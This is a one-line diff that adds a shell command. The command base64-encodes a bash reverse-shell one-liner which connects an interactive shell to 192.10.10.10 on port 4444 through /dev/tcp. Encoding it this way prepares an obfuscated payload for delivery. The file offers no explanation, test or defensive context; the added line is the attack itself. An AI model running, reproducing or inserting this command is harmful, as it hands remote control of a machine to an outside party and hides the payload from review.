@@ -1,0 +1,1 @@
+echo 'bash -c "bash -i >& /dev/tcp/192.10.10.10/4444 0>&1"' | base64
